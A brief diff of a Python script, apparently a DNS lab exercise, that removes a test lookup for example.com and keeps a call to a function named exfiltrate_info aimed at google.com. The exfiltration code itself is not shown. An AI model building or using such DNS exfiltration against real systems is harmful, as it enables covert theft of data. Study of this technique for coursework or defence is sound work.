@@ -69,9 +69,6 @@ if __name__ == '__main__':
     
     result = query_local_dns_server('nyu.edu.',question_type)    
     print(f"NYU IP address: {result}")
-    
-    result = query_local_dns_server('example.com.',question_type)    
-    print(f"Example.com IP address: {result}")
         
     #print(exfiltrate_info())
     exfiltrated_data = exfiltrate_info('google.com', question_type)
